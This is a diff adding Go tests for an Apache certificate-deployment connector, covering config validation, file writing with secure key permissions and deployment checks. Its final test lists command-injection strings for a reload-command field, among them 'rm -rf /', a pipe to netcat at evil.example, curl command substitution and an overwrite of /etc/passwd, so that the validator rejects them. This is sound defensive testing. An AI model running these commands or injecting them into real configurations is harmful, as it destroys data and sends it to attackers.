@@ -1,0 +1,242 @@
+package apache_test
+
+import (
+	"context"
+	"encoding/json"
+	"log/slog"
+	"os"
+	"path/filepath"
+	"testing"
+
+	"github.com/zulufun/certctl-localhost/internal/connector/target"
+	"github.com/zulufun/certctl-localhost/internal/connector/target/apache"
+)
+
+func TestApacheConnector_ValidateConfig(t *testing.T) {
+	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	ctx := context.Background()
+
+	t.Run("valid config", func(t *testing.T) {
+		tmpDir := t.TempDir()
+		cfg := apache.Config{
+			CertPath:        filepath.Join(tmpDir, "cert.pem"),
+			KeyPath:         filepath.Join(tmpDir, "key.pem"),
+			ChainPath:       filepath.Join(tmpDir, "chain.pem"),
+			ReloadCommand:   "true",
+			ValidateCommand: "true",
+		}
+
+		connector := apache.New(&cfg, logger)
+		rawConfig, _ := json.Marshal(cfg)
+		err := connector.ValidateConfig(ctx, rawConfig)
+		if err != nil {
+			t.Fatalf("ValidateConfig failed: %v", err)
+		}
+	})
+
+	t.Run("missing cert_path", func(t *testing.T) {
+		cfg := apache.Config{
+			ChainPath:       "/tmp/chain.pem",
+			ReloadCommand:   "true",
+			ValidateCommand: "true",
+		}
+
+		connector := apache.New(&cfg, logger)
+		rawConfig, _ := json.Marshal(cfg)
+		err := connector.ValidateConfig(ctx, rawConfig)
+		if err == nil {
+			t.Fatal("expected error for missing cert_path")
+		}
+	})
+
+	t.Run("missing reload_command", func(t *testing.T) {
+		cfg := apache.Config{
+			CertPath:        "/tmp/cert.pem",
+			ChainPath:       "/tmp/chain.pem",
+			ValidateCommand: "true",
+		}
+
+		connector := apache.New(&cfg, logger)
+		rawConfig, _ := json.Marshal(cfg)
+		err := connector.ValidateConfig(ctx, rawConfig)
+		if err == nil {
+			t.Fatal("expected error for missing reload_command")
+		}
+	})
+
+	t.Run("invalid JSON", func(t *testing.T) {
+		connector := apache.New(&apache.Config{}, logger)
+		err := connector.ValidateConfig(ctx, json.RawMessage(`{invalid}`))
+		if err == nil {
+			t.Fatal("expected error for invalid JSON")
+		}
+	})
+}
+
+func TestApacheConnector_DeployCertificate(t *testing.T) {
+	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	ctx := context.Background()
+
+	t.Run("successful deployment", func(t *testing.T) {
+		tmpDir := t.TempDir()
+		cfg := &apache.Config{
+			CertPath:        filepath.Join(tmpDir, "cert.pem"),
+			KeyPath:         filepath.Join(tmpDir, "key.pem"),
+			ChainPath:       filepath.Join(tmpDir, "chain.pem"),
+			ReloadCommand:   "true",
+			ValidateCommand: "true",
+		}
+
+		connector := apache.New(cfg, logger)
+
+		req := target.DeploymentRequest{
+			CertPEM:  "-----BEGIN CERTIFICATE-----\ntest\n-----END CERTIFICATE-----",
+			KeyPEM:   "-----BEGIN EC PRIVATE KEY-----\ntest\n-----END EC PRIVATE KEY-----",
+			ChainPEM: "-----BEGIN CERTIFICATE-----\nchain\n-----END CERTIFICATE-----",
+		}
+
+		result, err := connector.DeployCertificate(ctx, req)
+		if err != nil {
+			t.Fatalf("DeployCertificate failed: %v", err)
+		}
+
+		if !result.Success {
+			t.Fatalf("expected success, got: %s", result.Message)
+		}
+
+		// Verify files were written
+		certData, err := os.ReadFile(cfg.CertPath)
+		if err != nil {
+			t.Fatalf("failed to read cert file: %v", err)
+		}
+		if string(certData) != req.CertPEM {
+			t.Errorf("cert content mismatch")
+		}
+
+		// Verify key has secure permissions
+		info, err := os.Stat(cfg.KeyPath)
+		if err != nil {
+			t.Fatalf("failed to stat key file: %v", err)
+		}
+		if info.Mode().Perm() != 0600 {
+			t.Errorf("expected key permissions 0600, got %v", info.Mode().Perm())
+		}
+	})
+
+	t.Run("validate command fails", func(t *testing.T) {
+		tmpDir := t.TempDir()
+		cfg := &apache.Config{
+			CertPath:        filepath.Join(tmpDir, "cert.pem"),
+			KeyPath:         filepath.Join(tmpDir, "key.pem"),
+			ChainPath:       filepath.Join(tmpDir, "chain.pem"),
+			ReloadCommand:   "true",
+			ValidateCommand: "false", // always fails
+		}
+
+		connector := apache.New(cfg, logger)
+
+		req := target.DeploymentRequest{
+			CertPEM:  "cert",
+			ChainPEM: "chain",
+		}
+
+		result, err := connector.DeployCertificate(ctx, req)
+		if err == nil {
+			t.Fatal("expected error when validate command fails")
+		}
+		if result.Success {
+			t.Fatal("expected failure result")
+		}
+	})
+}
+
+func TestApacheConnector_ValidateDeployment(t *testing.T) {
+	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	ctx := context.Background()
+
+	t.Run("valid deployment", func(t *testing.T) {
+		tmpDir := t.TempDir()
+		certPath := filepath.Join(tmpDir, "cert.pem")
+		os.WriteFile(certPath, []byte("cert"), 0644)
+
+		cfg := &apache.Config{
+			CertPath:        certPath,
+			ValidateCommand: "true",
+		}
+
+		connector := apache.New(cfg, logger)
+
+		result, err := connector.ValidateDeployment(ctx, target.ValidationRequest{
+			CertificateID: "mc-test",
+			Serial:        "123",
+		})
+		if err != nil {
+			t.Fatalf("ValidateDeployment failed: %v", err)
+		}
+		if !result.Valid {
+			t.Fatal("expected valid deployment")
+		}
+	})
+
+	t.Run("missing cert file", func(t *testing.T) {
+		cfg := &apache.Config{
+			CertPath:        "/nonexistent/cert.pem",
+			ValidateCommand: "true",
+		}
+
+		connector := apache.New(cfg, logger)
+
+		result, err := connector.ValidateDeployment(ctx, target.ValidationRequest{
+			CertificateID: "mc-test",
+			Serial:        "123",
+		})
+		if err == nil {
+			t.Fatal("expected error for missing cert file")
+		}
+		if result.Valid {
+			t.Fatal("expected invalid result")
+		}
+	})
+}
+
+// Phase 7 SEC-H2 (2026-05-14): pin the config-time injection guard.
+// Every shell metacharacter that ValidateShellCommand rejects MUST
+// surface as a ValidateConfig error before the connector ever
+// reaches defaultRunCommand. Pre-Phase-7 a malicious string would
+// have been caught at the same gate; post-Phase-7 the same string
+// is ALSO rejected at exec-time via SplitShellCommand
+// (defense-in-depth) — but the config layer is the load-bearing
+// check that prevents the persisted config from carrying an
+// exploit payload in the first place.
+func TestApacheConnector_ValidateConfig_RejectsCommandInjection(t *testing.T) {
+	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	ctx := context.Background()
+	tmpDir := t.TempDir()
+	certPath := filepath.Join(tmpDir, "cert.pem")
+	if err := os.WriteFile(certPath, []byte("cert"), 0644); err != nil {
+		t.Fatalf("setup cert: %v", err)
+	}
+
+	maliciousCommands := []string{
+		"apachectl graceful; rm -rf /",         // semicolon-chain
+		"apachectl graceful | nc evil.example", // pipe
+		"apachectl graceful $(curl evil)",      // command substitution
+		"apachectl graceful `whoami`",          // backtick substitution
+		"apachectl graceful & malware",         // background spawn
+		"apachectl graceful > /etc/passwd",     // output redirection
+	}
+
+	for _, cmd := range maliciousCommands {
+		t.Run(cmd, func(t *testing.T) {
+			rawCfg, _ := json.Marshal(apache.Config{
+				CertPath:        certPath,
+				ReloadCommand:   cmd,
+				ValidateCommand: "apachectl configtest",
+			})
+			c := apache.New(nil, logger)
+			if err := c.ValidateConfig(ctx, rawCfg); err == nil {
+				t.Errorf("ValidateConfig accepted malicious ReloadCommand %q; want injection-rejection error", cmd)
+			}
+		})
+	}
+}
